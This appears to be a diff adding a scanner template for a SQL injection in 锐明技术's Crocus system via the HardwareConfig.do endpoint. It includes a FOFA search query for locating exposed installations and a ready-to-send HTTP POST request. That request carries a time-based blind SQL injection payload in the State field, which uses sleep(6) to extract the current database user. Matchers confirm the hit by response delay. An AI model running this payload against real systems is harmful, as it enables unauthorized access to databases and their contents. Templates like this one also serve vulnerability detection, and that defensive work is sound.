@@ -1,0 +1,31 @@
+## id: VEID-2026-11128
+## name: 锐明技术Crocus系统 HardwareConfig.do SQL注入漏洞
+## author: hack007x
+## severity: high
+## tags: veid,sql,veid2026
+## description: 锐明技术Crocus系统 HardwareConfig.do SQL注入漏洞，攻击者可进行sql注入攻击获取数据库信息或者权限。
+## affects: 锐明技术Crocus系统
+## fofa-query: body="/ThirdResource/respond/respond.min.js" && title="Crocus"
+## verification: true
+
+
+
+POST /HardwareConfig.do?Action=ReadTask HTTP/1.1
+Host: {{Hostname}}
+User-Agent: {{random_ua}}
+Content-Type: application/x-www-form-urlencoded
+
+PageIndex=0&PageSize=20&State=(select*from(select%09if(ascii(substr(current_user,1,1))>1,sleep(6),1))a)
+
+
+#@ condition: and
+#@ matcher: response_time >= 6 && response_time < 8
+#@ matcher: status_code == 200
+
+
+
+
+
+
+
+# @VEIL-STAMP: 51353ac133ee1f4127547ff49496b2518edd2e297e205d085b3619d13f777489
